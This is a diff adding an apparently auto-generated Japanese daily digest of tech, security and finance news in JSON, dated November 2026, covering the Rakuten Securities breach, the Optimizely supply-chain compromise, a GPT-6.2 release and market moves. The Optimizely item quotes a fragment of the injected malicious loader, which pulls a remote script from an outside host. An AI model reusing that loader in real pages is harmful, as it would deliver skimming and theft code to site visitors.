@@ -1,0 +1,813 @@
+{
+  "date": "2026-11-18",
+  "generated_at": "2026-11-18T05:13:07+09:00",
+  "stats": {
+    "collected": 246,
+    "sources_ok": 25,
+    "sources_total": 26,
+    "by_group": {
+      "hackernews": 50,
+      "tech_blog": 73,
+      "news": 109,
+      "official": 14
+    },
+    "failed_sources": [
+      "coindesk_jp"
+    ]
+  },
+  "digest": [
+    {
+      "category": "sec",
+      "text": "楽天証券がテスト環境への不正アクセスで顧客情報の漏えい可能性を公表。年収・勤務先などを含む情報が最大約 447 万口座、ログイン ID などが最大約 1,125 万口座。パスワードの漏えいと不正取引は確認されていない。",
+      "keywords": [
+        "data-breach",
+        "security-incident"
+      ]
+    },
+    {
+      "category": "sec",
+      "text": "Optimizely Web の顧客プロジェクトが改ざんされ、Zoom・GitLab・CNN など 178 組織のサイトで暗号資産すり替え・カードスキミングを行うスクリプトが配信された（HN 640 pt）。cdn.optimizely.com を許可するだけの CSP では防げなかった。",
+      "keywords": [
+        "supply-chain",
+        "csp"
+      ]
+    },
+    {
+      "category": "ai",
+      "text": "OpenAI が GPT-6.2 Astra / Sol を公開し、Amazon Bedrock でも同日に提供開始（HN 680 pt）。HN 首位は CMU の CS 講義無料公開（2215 pt）、Windows 11 がコーディングエージェントの利用を診断データで記録している件も 696 pt。",
+      "keywords": [
+        "openai",
+        "llm",
+        "cs-education"
+      ]
+    },
+    {
+      "category": "crypto",
+      "text": "Wintermute はビットコインが 200 週移動平均（約 6.8 万ドル）を割り込み弱気相場が続いているとの見方。12 月の米利上げ観測（約 92%）と ETF の資金流出が背景で、含み益にある供給の割合は 52% まで低下した。",
+      "keywords": [
+        "bitcoin",
+        "fed"
+      ]
+    },
+    {
+      "category": "stocks",
+      "text": "17 日の日経平均は 801 円安の 5 万 8,860 円で大幅続落。半導体株中心の売り。国内長期金利は 10 月の 3.115% から足元 2.8% 台に低下しており、12 月の 2027 年度予算案の国債発行額が次の焦点とされる。",
+      "keywords": [
+        "nikkei225",
+        "jgb"
+      ]
+    }
+  ],
+  "items": [
+    {
+      "id": "2026-11-18-cmu-cs-learn",
+      "url": "https://www.cs.cmu.edu/learn/",
+      "title": "Carnegie Mellon is putting computer science courses on YouTube for free",
+      "source": "cs.cmu.edu",
+      "source_group": "hackernews",
+      "published_at": "2026-11-17T05:43:36+09:00",
+      "category": "ai",
+      "keywords": [
+        "cs-education",
+        "ai-agent"
+      ],
+      "score": 100,
+      "why": "HN 2215 pt・298 コメント",
+      "read_min": 3,
+      "tldr": "カーネギーメロン大学の計算機科学部が、実際の授業の講義動画を YouTube で無料公開する「CS Learn」を始めた。11 月に 8 科目、2027 年 1 月に 5 科目を公開する予定で、自習用の教材と AI チューターも準備中としている。",
+      "points": [
+        "11 月公開は Machine Learning with Large Datasets、Principles of Software Construction、Machine Learning Systems、AI Agents、Machine Learning in Production など 8 科目",
+        "2027 年 1 月には Probability and Computing、Multimodal Machine Learning など 5 科目を追加予定",
+        "講義の視聴は無料。課題の採点や正式な修了証は CMU Online で別途提供し、即時フィードバック付きの自習教材と AI チューターは「近日」とされている"
+      ],
+      "code": null,
+      "signal": "B! 6 · ▲ 2215",
+      "pick": true
+    },
+    {
+      "id": "2026-11-18-rakuten-sec-breach",
+      "url": "https://www.rakuten-sec.co.jp/web/info/info20261117-02.html",
+      "title": "当社お客様の情報漏えいの可能性に関するお詫びとお知らせ:楽天証券",
+      "source": "rakuten-sec.co.jp",
+      "source_group": "tech_blog",
+      "published_at": "2026-11-17T17:41:53+09:00",
+      "category": "sec",
+      "keywords": [
+        "data-breach",
+        "security-incident",
+        "passkey"
+      ],
+      "score": 94,
+      "why": "はてブ 660（楽天証券の公式発表）・Impress の続報 はてブ 149 を統合",
+      "read_min": 4,
+      "tldr": "楽天証券が、第三者の不正アクセスによりテスト環境のシステムから顧客情報が漏えいした可能性があると公表した。氏名・住所・勤務先・年収などを含む情報は最大約 447 万口座、ログイン ID などは最大約 1,125 万口座が対象。パスワード・暗証番号の漏えいは確認されていないという。",
+      "points": [
+        "11 月 16 日に不正アクセスの可能性を検知して遮断。調査で、テスト環境のシステム内の情報の一部が 11 月 11 日に外部へ漏えいしたおそれがあると判明した",
+        "最大約 447 万口座は氏名・生年月日・住所・電話・メール・勤務先・出金先口座・申告年収と金融資産・商品別資産など、最大約 1,125 万口座は部店・お客様コードとログイン ID のみ（解約済みの顧客を含む）",
+        "原因は調査中。本件による不正ログイン・不正取引は確認されていないとし、パスキーログインの必須化を進めるほか、取引・出金の一時停止設定とフィッシングへの注意を呼びかけている"
+      ],
+      "code": null,
+      "signal": "B! 660",
+      "pick": true
+    },
+    {
+      "id": "2026-11-18-ap-jpmorgan-outage",
+      "url": "https://apnews.com/article/bank-outage-chase-wells-fargo-truist-50fee2693c22f597fa6ca51a97ef2cda",
+      "title": "Technical issue at JPMorgan Chase triggers online banking delays for US banks",
+      "source": "apnews.com",
+      "source_group": "hackernews",
+      "published_at": "2026-11-17T03:31:30+09:00",
+      "category": "cloud",
+      "keywords": [
+        "system-outage",
+        "payments"
+      ],
+      "score": 92,
+      "why": "HN 816 pt・695 コメント",
+      "read_min": null,
+      "tldr": "JPMorgan Chase の技術的な問題をきっかけに、米国の複数の銀行でオンラインバンキングの遅延が起きたと AP が報じた（見出しより。本文は未確認）。",
+      "points": [],
+      "code": null,
+      "signal": "▲ 816",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-xusheng-windows-agent-telemetry",
+      "url": "https://xusheng.dev/posts/windows-coding-agent-telemetry/",
+      "title": "Windows 11 is collecting data on which coding agents and developer tools you use",
+      "source": "xusheng.dev",
+      "source_group": "hackernews",
+      "published_at": "2026-11-17T07:58:20+09:00",
+      "category": "sec",
+      "keywords": [
+        "privacy",
+        "microsoft",
+        "coding-agent"
+      ],
+      "score": 90,
+      "why": "HN 696 pt・577 コメント",
+      "read_min": 8,
+      "tldr": "Windows 11 のコンポーネント MissionControlAggregator.dll が、Claude Code・Codex・Copilot CLI・Cursor などのコーディングエージェントや node・python・gcc などの開発ツールを使ったかどうかをビットマップで記録し、オプションの診断データとして送信キューに載せていることを、バイナリ解析で突き止めた記事。",
+      "points": [
+        "実行ファイル名（copilot.exe・claude.exe・codex.exe・cursor.exe など）のハードコード文字列と照合関数から特定し、cmd.exe を codex.exe などにコピーしてビットが立つことを確認した",
+        "記録されるのは「報告期間中に観測されたか」のビットのみで、プロンプトやソースコード、使用時間は含まれないと筆者は確認している",
+        "オプションの診断データ扱いのため、筆者が試した米国の初期設定では既定で送信対象。「設定 → プライバシーとセキュリティ → 診断とフィードバック」でオプションの診断データ送信をオフにすれば止められる"
+      ],
+      "code": {
+        "file": "event.json",
+        "lang": "json",
+        "text": "{\n  \"name\": \"Microsoft.Windows.MissionControlAggregator.Segments.SubCohorts\",\n  \"ext\": { \"privacy\": { \"isRequired\": false } },\n  \"data\": {\n    \"Version\": \"0.1.5\",\n    \"CliAgentSubCohorts\": [4],\n    \"DesktopAgentSubCohorts\": [0],\n    \"FlushedFromSave\": true\n  }\n}"
+      },
+      "signal": "▲ 696",
+      "pick": true
+    },
+    {
+      "id": "2026-11-18-openai-gpt-6-2",
+      "url": "https://openai.com/index/introducing-gpt-6-2-astra-sol/",
+      "title": "GPT‑6.2 Astra and Sol",
+      "source": "openai.com",
+      "source_group": "hackernews",
+      "published_at": "2026-11-18T02:46:43+09:00",
+      "category": "ai",
+      "keywords": [
+        "openai",
+        "llm",
+        "coding-agent"
+      ],
+      "score": 89,
+      "why": "HN 680 pt・400 コメント",
+      "read_min": 5,
+      "tldr": "OpenAI が GPT-6.2 Astra と GPT-6.2 Sol を公開した。Astra は判断力が要る難しい業務・研究・高度なコーディング向けのフラッグシップ、Sol は速度とタスク単価を重視した日常業務・エージェント向けで、ChatGPT・Codex・API に加え Amazon Bedrock でも同日に提供が始まった。（openai.com は取得できず、AWS の公式告知と OpenAI の公式 X 投稿で確認）",
+      "points": [
+        "API のモデル名は gpt-6.2-astra と gpt-6.2-sol。両モデルとも Fast / Ultrafast モードに対応し、Ultrafast の料金は 3 か月間 50% 引き下げ（Standard の 3 倍）と OpenAI Developers が告知",
+        "OpenAI は Astra について、専門業務と科学研究の評価で最高値を更新しつつ、タスクあたりのコストは GPT-6 Astra の 3 分の 1 未満だと主張（同社の自己申告）",
+        "Amazon Bedrock でも一般提供。AWS は Astra を複雑な判断・コードベース調査・画像を含む推論向け、Sol を検証可能な成果がある大量の定型業務向けと位置づけている"
+      ],
+      "code": null,
+      "signal": "B! 2 · ▲ 680",
+      "pick": true
+    },
+    {
+      "id": "2026-11-18-reporturi-optimizely",
+      "url": "https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/",
+      "title": "Optimizely compromised, served malware on Zoom, GitLab",
+      "source": "blog.report-uri.com",
+      "source_group": "hackernews",
+      "published_at": "2026-11-17T08:00:34+09:00",
+      "category": "sec",
+      "keywords": [
+        "supply-chain",
+        "security-incident",
+        "csp"
+      ],
+      "score": 88,
+      "why": "HN 640 pt・253 コメント（OPTIMJACK の解説記事 HN 190 pt を統合）",
+      "read_min": 9,
+      "tldr": "A/B テスト基盤 Optimizely Web の顧客プロジェクトに悪性 JavaScript が書き込まれ、Zoom・GitLab・CNN・BBC・HSBC など 178 組織のサイト訪問者に配信された。暗号資産アドレスのすり替え、カード情報の窃取、Cookie とスクリーンショットの送信、iOS 向けエクスプロイトの読み込みを行っていた。",
+      "points": [
+        "11 月 16 日 04:21 UTC に最初の改ざんを観測し、同日 23:11 UTC までに感染ファイルは全て除去。Report URI が調べた 1,611 スニペット中 188 件（178 組織）が感染していた",
+        "CDN は渡されたファイルをそのまま配信しており、侵害は顧客プロジェクト単位。攻撃者が書き込み権限を得た方法は Optimizely から説明されていない",
+        "CSP で防げたのは調査対象の約 15%。cdn.optimizely.com を許可するだけでは防げず、'strict-dynamic' や 'unsafe-eval' を許すと素通りした。厳しい connect-src はカード・Cookie の送出を止めたが、ページ内のアドレスすり替えは防げなかった"
+      ],
+      "code": {
+        "file": "projectJS（Zoom のスニペットに挿入されていたローダー）",
+        "lang": "javascript",
+        "text": "\"projectJS\": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;"
+      },
+      "signal": "▲ 640",
+      "pick": true
+    },
+    {
+      "id": "2026-11-18-register-m365-defect",
+      "url": "https://www.theregister.com/saas/2026/11/16/microsoft-blames-monster-email-outage-on-software-defect-introduced-in-july-fix/5310026",
+      "title": "Microsoft blames monster email outage on software defect introduced in July fix",
+      "source": "theregister.com",
+      "source_group": "hackernews",
+      "published_at": "2026-11-16T22:18:22+09:00",
+      "category": "cloud",
+      "keywords": [
+        "system-outage",
+        "microsoft",
+        "incident-response"
+      ],
+      "score": 83,
+      "why": "HN 435 pt・329 コメント",
+      "read_min": null,
+      "tldr": "先週の Microsoft 365 メール障害について、Microsoft が 7 月の修正で入り込んだソフトウェアの不具合が原因だと説明したと The Register が報じた（見出しより）。最終版の事後レポートは 20 日の予定。",
+      "points": [],
+      "code": null,
+      "signal": "▲ 435",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-apple-services-down",
+      "url": "https://developer.apple.com/system-status/",
+      "title": "Apple Services Down",
+      "source": "developer.apple.com",
+      "source_group": "hackernews",
+      "published_at": "2026-11-18T02:47:14+09:00",
+      "category": "cloud",
+      "keywords": [
+        "system-outage",
+        "apple"
+      ],
+      "score": 81,
+      "why": "HN 377 pt・207 コメント",
+      "read_min": null,
+      "tldr": "Apple の開発者向けサービスで障害が発生し、システムステータスのページが HN で共有された（本文の障害内容は未確認）。",
+      "points": [],
+      "code": null,
+      "signal": "B! 19 · ▲ 377",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-breck-software-breaking",
+      "url": "https://www.breck-mckye.com/blog/2026/11/software-is-breaking-down-at-a-systemic-level/",
+      "title": "Software is breaking down at a systemic level",
+      "source": "breck-mckye.com",
+      "source_group": "hackernews",
+      "published_at": "2026-11-17T03:17:17+09:00",
+      "category": "be",
+      "keywords": [
+        "software-design",
+        "testing"
+      ],
+      "score": 81,
+      "why": "HN 384 pt・247 コメント",
+      "read_min": null,
+      "tldr": "ソフトウェアの品質が業界全体で崩れつつあると論じるエッセイ。相次ぐ大規模障害を背景に HN で議論になった（タイトルからの要約）。",
+      "points": [],
+      "code": null,
+      "signal": "B! 1 · ▲ 384",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-reuters-us-classified-network",
+      "url": "https://www.reuters.com/technology/highly-classified-us-national-security-communications-network-is-down-cnn-2026-11-17/",
+      "title": "NSA Internal Network Down",
+      "source": "reuters.com",
+      "source_group": "hackernews",
+      "published_at": "2026-11-18T00:50:48+09:00",
+      "category": "sec",
+      "keywords": [
+        "system-outage",
+        "networking"
+      ],
+      "score": 78,
+      "why": "HN 308 pt・CNN の同一話題 HN 260 pt を統合",
+      "read_min": null,
+      "tldr": "米国の機密扱いの国家安全保障通信ネットワークがダウンしたと CNN・ロイターが報じた（見出しより。原因は未確認）。",
+      "points": [],
+      "code": null,
+      "signal": "▲ 308",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-zenn-mutation-test",
+      "url": "https://zenn.dev/mizchi/articles/mutation-test-quality",
+      "title": "おい、 Mutation Test をやれ。テスト品質を、測るために",
+      "source": "zenn.dev",
+      "source_group": "tech_blog",
+      "published_at": "2026-11-17T18:59:42+09:00",
+      "category": "be",
+      "keywords": [
+        "testing",
+        "ai-coding"
+      ],
+      "score": 78,
+      "why": "はてブ 222",
+      "read_min": null,
+      "tldr": "AI でテストカバレッジを上げるのは簡単になったが、カバレッジはテストの質を測れない。コードをわざと壊してテストが落ちるかを見るミューテーションテストで、テスト品質を測るべきだと勧める記事。",
+      "points": [],
+      "code": null,
+      "signal": "B! 222",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-forest-modern-web-guidance",
+      "url": "https://forest.watch.impress.co.jp/docs/news/2156904.html",
+      "title": "AIが時代遅れのWebサイトを書くのを防ぐスキル「Modern Web Guidance」が安定版に／「Edge」「Firefox」も参加、Webサイトのモダナイズにも",
+      "source": "forest.watch.impress.co.jp",
+      "source_group": "tech_blog",
+      "published_at": "2026-11-17T10:04:18+09:00",
+      "category": "ai",
+      "keywords": [
+        "ai-coding",
+        "css"
+      ],
+      "score": 76,
+      "why": "はてブ 193",
+      "read_min": null,
+      "tldr": "AI が古い書き方の Web サイトを生成するのを防ぐスキル「Modern Web Guidance」が安定版になり、Edge と Firefox のチームも参加した。既存サイトのモダナイズにも使えるという。",
+      "points": [],
+      "code": null,
+      "signal": "B! 193",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-opencode-browse",
+      "url": "https://opencode.ai/product/browse",
+      "title": "OpenCode Browse",
+      "source": "opencode.ai",
+      "source_group": "hackernews",
+      "published_at": "2026-11-17T06:20:37+09:00",
+      "category": "ai",
+      "keywords": [
+        "coding-agent",
+        "oss"
+      ],
+      "score": 79,
+      "why": "HN 320 pt・207 コメント",
+      "read_min": null,
+      "tldr": "OSS のコーディングエージェント OpenCode が、新製品「OpenCode Browse」を発表した（製品ページのタイトルより。機能の詳細は未確認）。",
+      "points": [],
+      "code": null,
+      "signal": "B! 5 · ▲ 320",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-claude-code-verification",
+      "url": "https://claude.dev/blog/how-the-claude-code-team-thinks-about-verification/",
+      "title": "How the Claude Code team thinks about verification",
+      "source": "claude.dev",
+      "source_group": "hackernews",
+      "published_at": "2026-11-17T19:20:40+09:00",
+      "category": "ai",
+      "keywords": [
+        "claude",
+        "coding-agent",
+        "testing"
+      ],
+      "score": 73,
+      "why": "HN 209 pt・はてブ 14",
+      "read_min": null,
+      "tldr": "Claude Code チームが、エージェントが書いたコードの検証をどう考えているかを解説したブログ記事（タイトルからの要約）。",
+      "points": [],
+      "code": null,
+      "signal": "B! 14 · ▲ 209",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-github-mdash",
+      "url": "https://github.blog/open-source/maintainers/maintainers-dont-need-more-ai-bug-reports-they-need-fixes/",
+      "title": "Maintainers don’t need more AI bug reports. They need fixes.",
+      "source": "github.blog",
+      "source_group": "news",
+      "published_at": "2026-11-18T03:29:29+09:00",
+      "category": "sec",
+      "keywords": [
+        "ai-security",
+        "oss",
+        "vulnerability-management"
+      ],
+      "score": 55,
+      "why": "GitHub 公式ブログ。AI による脆弱性報告の OSS への影響",
+      "read_min": null,
+      "tldr": "GitHub と Microsoft の試験プロジェクト「Codename MDASH」で、AI が見つけた大量の指摘を検証済みの非公開報告 99 件と修正案にまとめ、広く使われる OSS 6 件に送った。メンテナーはすでに半数以上を修正したという。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-coinpost-btc-bear",
+      "url": "https://coinpost.jp/?p=748370",
+      "title": "ビットコイン弱気相場抜けず、5万ドル台を想定＝ウィンターミュート",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-11-17T15:00:36+09:00",
+      "category": "crypto",
+      "keywords": [
+        "bitcoin",
+        "bitcoin-etf",
+        "fed"
+      ],
+      "score": 90,
+      "why": "matched: ビットコイン, 金利",
+      "read_min": 4,
+      "tldr": "マーケットメーカーの Wintermute は週次レポートで、ビットコインが 200 週移動平均線（約 6.8 万ドル）を割り込んで弱気相場が続いているとし、5 万ドル台までの下押しを想定した。12 月の米利上げ観測と現物 ETF からの資金流出を背景に挙げている。",
+      "points": [
+        "前週は 12.7% 下落して 6.54 万ドルで引け、14 日には一時約 6.2 万ドルと約 4 か月ぶりの安値。次の節目は 6.2 万ドルと、プットが集中する 6 万ドル",
+        "背景として、米コア CPI が 3 か月連続で前月比 0.3% 上昇し、12 月利上げの織り込みが約 92%、米 10 年債利回りが 5.15% に上昇。米現物 BTC ETF は 2026 年累計で約 19 億ドルの純流出",
+        "CryptoQuant 認定アナリストの分析（CoinPost 別記事）では、含み益にある BTC 供給の割合が 1 週間で 7 ポイント下がって 52% になり、長期保有者の保有量も 90 日来の低水準"
+      ],
+      "code": null,
+      "signal": null,
+      "pick": true
+    },
+    {
+      "id": "2026-11-18-diamond-jgb-peak",
+      "url": "https://diamond.jp/articles/-/403531",
+      "title": "長期金利「3.115％」はピークだったのか？国債暴落“4つの背景”と27年の金利再上昇リスク - 経済分析の哲人が斬る！市場トピックの深層",
+      "source": "diamond.jp",
+      "source_group": "news",
+      "published_at": "2026-11-18T04:30:00+09:00",
+      "category": "macro",
+      "keywords": [
+        "jgb",
+        "interest-rates",
+        "jp-fiscal"
+      ],
+      "score": 88,
+      "why": "matched: 金利",
+      "read_min": 6,
+      "tldr": "10 年国債利回りは 9 月 25 日と 10 月 6 日の 3.115% をピークに、11 月 6 日には一時 2.610% まで低下し、足元は 2.8% 台。日銀の利上げ見通し、高市政権の財政運営、海外金利、国内需給の 4 点から背景を検証する記事（後半は有料で未読）。",
+      "points": [
+        "国内の機関投資家が高い利回りに着目して断続的に買いを入れ始めたが、市場が完全に回復したわけではないとする",
+        "個人の需要は強く、10 月募集の個人向け国債（固定 5 年、利率 2.39%）は約 1 兆 3,151 億円と前月の約 2.5 倍",
+        "リスクは 12 月に決まる 2027 年度予算案。新規国債発行が目安とされる約 40 兆円を大きく超えれば、金利が再び急上昇しうると指摘"
+      ],
+      "code": null,
+      "signal": null,
+      "pick": true
+    },
+    {
+      "id": "2026-11-18-fsa-basel-irrbb",
+      "url": "https://www.fsa.go.jp/inter/bis/20261116/20261116.html",
+      "title": "国際関係,バーゼル銀行監督委員会による市中協議文書「銀行勘定の金利リスクに関する追加的な第２の柱ガイダンス」について公表しました。",
+      "source": "fsa.go.jp",
+      "source_group": "official",
+      "published_at": "2026-11-17T02:00:00+09:00",
+      "category": "macro",
+      "keywords": [
+        "bank-supervision",
+        "interest-rates",
+        "fsa"
+      ],
+      "score": 75,
+      "why": "金融庁の公式発表・matched: 金利",
+      "read_min": 3,
+      "tldr": "金融庁が、バーゼル銀行監督委員会の市中協議文書「銀行勘定の金利リスク（IRRBB）に関する追加的な第 2 の柱ガイダンス」を紹介した。インフレと急速な利上げの局面で表面化した金利リスク管理の課題に対応し、2016 年の基準の実効性を高めるのが目的。",
+      "points": [
+        "バーゼル委の公表は 11 月 9 日、コメント期限は 2027 年 2 月 9 日（英語で提出）",
+        "追加ガイダンスの項目は、モデルのリスク管理と検証、ストレステスト、内部管理、有価証券の含み損益の扱い、短・中期の収益指標、監督上の情報",
+        "ガイダンスとあわせて、基準本体の見直しも提案されている"
+      ],
+      "code": null,
+      "signal": null,
+      "pick": true
+    },
+    {
+      "id": "2026-11-18-kabutan-nikkei-1117",
+      "url": "https://kabutan.jp/news/marketnews/?b=n202611171305",
+      "title": "【↓】日経平均 大引け｜ 大幅続落、半導体株中心にリスク回避の売り継続 (11月17日)",
+      "source": "kabutan.jp",
+      "source_group": "news",
+      "published_at": "2026-11-17T15:30:00+09:00",
+      "category": "stocks",
+      "keywords": [
+        "nikkei225",
+        "semiconductor"
+      ],
+      "score": 72,
+      "why": "関連: 株式（前営業日の終値）",
+      "read_min": null,
+      "tldr": "17 日の日経平均は前日比 801.59 円（1.34%）安の 5 万 8,860.43 円で大幅続落。米商務省の半導体輸出規制の強化を巡る発表を受け、AI・半導体関連株を中心に売りが優勢だった（検索結果の要約で確認）。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-fsa-tsumitate-list",
+      "url": "https://www.fsa.go.jp/policy/nisa2/products/index.html",
+      "title": "その他,つみたて投資枠対象商品届出一覧及びつみたて投資枠対象商品の概要を更新しました。",
+      "source": "fsa.go.jp",
+      "source_group": "official",
+      "published_at": "2026-11-17T02:00:00+09:00",
+      "category": "funds",
+      "keywords": [
+        "new-nisa",
+        "fsa"
+      ],
+      "score": 78,
+      "why": "金融庁の公式発表・matched: nisa",
+      "read_min": null,
+      "tldr": "金融庁が、NISA つみたて投資枠の対象商品届出一覧と対象商品の概要を更新した。",
+      "points": [],
+      "code": null,
+      "signal": "B! 14",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-nikkei-defense-budget",
+      "url": "https://www.nikkei.com/article/DGXZQOUA152HN0V11C26A1000000/",
+      "title": "防衛費50兆〜60兆円台、与党から異論 既存契約や円安で｢実質減｣ - 日本経済新聞",
+      "source": "nikkei.com",
+      "source_group": "tech_blog",
+      "published_at": "2026-11-16T19:05:58+09:00",
+      "category": "macro",
+      "keywords": [
+        "jp-fiscal",
+        "fx"
+      ],
+      "score": 62,
+      "why": "matched: 為替",
+      "read_min": null,
+      "tldr": "2027 年度からの 5 年間の防衛費を 50 兆〜60 兆円台とする案に与党から異論が出ている。契約済み装備品の支払いや円安・物価高を考えると新規施策の余地が乏しいとの主張で、財源の増税には慎重論が根強い。",
+      "points": [],
+      "code": null,
+      "signal": "B! 14",
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-diamond-yen-selling",
+      "url": "https://diamond.jp/articles/-/403569",
+      "title": "米中露首脳会談で高市政権が直面する“外交孤立”、止まらない円売りと「2つの潜在的危機」 - 田中均の「世界を見る眼」",
+      "source": "diamond.jp",
+      "source_group": "news",
+      "published_at": "2026-11-18T04:25:00+09:00",
+      "category": "macro",
+      "keywords": [
+        "fx",
+        "geopolitics",
+        "consumption-tax"
+      ],
+      "score": 65,
+      "why": "matched: 為替",
+      "read_min": null,
+      "tldr": "19 日の米中露首脳会談を控え、対中・対ロ関係が悪化する日本が孤立しかねないとする論考。消費税減税などによる財政規律の緩みへの懸念から円売りも再び強まっていると指摘する。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-coinpost-evernorth-xrp",
+      "url": "https://coinpost.jp/?p=748384",
+      "title": "エバーノース、保有XRPの減損累計約803億円 簿価は取得時の4割",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-11-17T16:00:01+09:00",
+      "category": "crypto",
+      "keywords": [
+        "xrp",
+        "earnings"
+      ],
+      "score": 50,
+      "why": "関連: 暗号資産",
+      "read_min": null,
+      "tldr": "ナスダック上場の XRP 保有企業エバーノースが初の四半期報告書を提出。9 月末の保有 XRP の簿価は約 3 億 4,189 万ドルで、減損の累計は約 5 億ドルに達した。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-coinpost-cftc-backpack",
+      "url": "https://coinpost.jp/?p=748275",
+      "title": "米CFTC、Backpackの仮想通貨デリバティブ取引所・清算機関を承認",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-11-17T13:12:25+09:00",
+      "category": "crypto",
+      "keywords": [
+        "crypto-regulation",
+        "crypto-exchange"
+      ],
+      "score": 50,
+      "why": "関連: 暗号資産",
+      "read_min": null,
+      "tldr": "米 CFTC が、暗号資産企業 Backpack の米国事業にデリバティブ取引所と清算機関の資格を付与した。同社は無期限先物などの提供を計画している。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-coinpost-kalshi-stocks",
+      "url": "https://coinpost.jp/?p=748223",
+      "title": "予測市場に止まらず カルシ、2カ月以内に株取引を提供開始へ",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-11-17T11:30:44+09:00",
+      "category": "stocks",
+      "keywords": [
+        "prediction-market",
+        "us-stocks"
+      ],
+      "score": 55,
+      "why": "matched: 米国株（関連）",
+      "read_min": null,
+      "tldr": "予測市場のカルシが 7 月に買収した証券会社を通じ、2 か月以内に株式取引を始める計画だと WSJ が報じた。複数の資産を扱う取引所づくりを進めている。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-11-18-coinpost-eth-quantum",
+      "url": "https://coinpost.jp/?p=748286",
+      "title": "イーサリアムの量子対策、ヴィタリックが早期実装を狙える新方式を支持",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-11-17T12:00:46+09:00",
+      "category": "crypto",
+      "keywords": [
+        "ethereum",
+        "post-quantum"
+      ],
+      "score": 52,
+      "why": "関連: 暗号資産",
+      "read_min": null,
+      "tldr": "イーサリアム共同創設者のブテリン氏が、量子耐性署名を集約する提案 EIP-8288 の実装方式として leanPCS の支持に転じた。署名データが最大 6KB に膨らむ課題への対応で、早期実装を狙えるという。",
+      "points": [],
+      "code": null,
+      "signal": "B! 1",
+      "pick": false
+    }
+  ],
+  "social": [
+    {
+      "network": "x",
+      "author": "@OpenAI",
+      "url": "https://x.com/OpenAI/status/2122750124543926515",
+      "text": "GPT-6.2 Astra と Sol の提供開始を告知。効率がよく、実務で力を発揮するモデルだとしている。",
+      "metrics": null,
+      "heat": null,
+      "category": "ai",
+      "keywords": [
+        "openai",
+        "llm"
+      ],
+      "posted_at": "2026-11-18T02:54:03+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@OpenAIDevs",
+      "url": "https://x.com/OpenAIDevs/status/2122752500877144461",
+      "text": "API では gpt-6.2-astra と gpt-6.2-sol を使うよう案内。両モデルが Fast / Ultrafast に対応し、Ultrafast の料金を 3 か月間 50% 引き下げると告知。",
+      "metrics": null,
+      "heat": null,
+      "category": "ai",
+      "keywords": [
+        "openai",
+        "llm"
+      ],
+      "posted_at": "2026-11-18T03:03:29+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@Scott_Helme",
+      "url": "https://x.com/Scott_Helme/status/2122464168989098461",
+      "text": "Optimizely 経由で世界の大手サイトに悪性 JavaScript が配信されていたと報告。178 組織が影響を受け、暗号資産の窃取やカードスキミング、iOS エクスプロイトまで含むという。",
+      "metrics": null,
+      "heat": null,
+      "category": "sec",
+      "keywords": [
+        "supply-chain",
+        "security-incident"
+      ],
+      "posted_at": "2026-11-17T07:57:46+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@troyhunt",
+      "url": "https://x.com/troyhunt/status/2122471092430438553",
+      "text": "調査の当初、Pi-hole がもともと Optimizely をブロックしていたためマルウェアから守られていたと投稿。調べるために許可する必要があったという。",
+      "metrics": null,
+      "heat": null,
+      "category": "sec",
+      "keywords": [
+        "supply-chain"
+      ],
+      "posted_at": "2026-11-17T08:25:16+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@nikkei",
+      "url": "https://x.com/nikkei/status/2122633582560612610",
+      "text": "楽天証券への不正アクセスで、年収などを含む顧客情報が最大 447 万口座分漏えいした可能性があると報道を共有。",
+      "metrics": null,
+      "heat": null,
+      "category": "sec",
+      "keywords": [
+        "data-breach"
+      ],
+      "posted_at": "2026-11-17T19:10:57+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@goto_finance",
+      "url": "https://x.com/goto_finance/status/2122628655004446825",
+      "text": "楽天証券の情報漏えいについて、ログイン ID・氏名・住所・勤務先・出金先口座・年収や金融資産などが対象で、規模と内容は最近の国内事例でもかなり深刻だと指摘。パスワードの流出は確認されていないと補足。",
+      "metrics": null,
+      "heat": null,
+      "category": "sec",
+      "keywords": [
+        "data-breach",
+        "security-incident"
+      ],
+      "posted_at": "2026-11-17T18:51:22+09:00"
+    },
+    {
+      "network": "hn",
+      "author": null,
+      "url": "https://news.ycombinator.com/item?id=50522980",
+      "text": "『Carnegie Mellon is putting computer science courses on YouTube for free』のスレッド。298 件のコメント",
+      "metrics": "▲ 2215  ✉ 298",
+      "heat": 100,
+      "category": "ai",
+      "keywords": [
+        "cs-education"
+      ],
+      "posted_at": "2026-11-17T05:43:36+09:00"
+    }
+  ],
+  "releases": [
+    {
+      "date": "2026-11-18",
+      "title": "uv 0.13.9",
+      "repo": "astral-sh/uv",
+      "url": "https://github.com/astral-sh/uv/releases/tag/0.13.9",
